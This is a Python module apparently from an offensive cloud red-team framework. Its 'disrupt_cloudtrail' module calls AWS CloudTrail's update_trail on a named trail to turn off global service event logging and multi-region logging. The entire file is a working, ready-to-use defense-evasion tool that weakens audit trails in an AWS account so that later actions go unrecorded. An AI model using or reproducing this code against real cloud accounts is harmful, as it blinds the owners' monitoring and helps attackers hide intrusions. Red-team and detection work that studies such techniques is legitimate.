import boto3

from rebelykos.core.teamserver.module import Module


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "disrupt_cloudtrail"
        self.description = ("Make IncludeGlobalServiceEvents"
                            " and IsMultiRegionTrail False")
        self.author = "Takahiro Yokoyama"
        self.options["name"] = {
            "Description": "Name of the trail to disrupt",
            "Required": True,
            "Value": ""
        }

    def run(self):
        result = []
        client = boto3.client("cloudtrail", **self["profile"])
        result.extend(self._handle_err(client.update_trail,
                                       msg="Successfully disrupt trail!",
                                       Name=self["name"],
                                       IncludeGlobalServiceEvents=False,
                                       IsMultiRegionTrail=False))
        return result

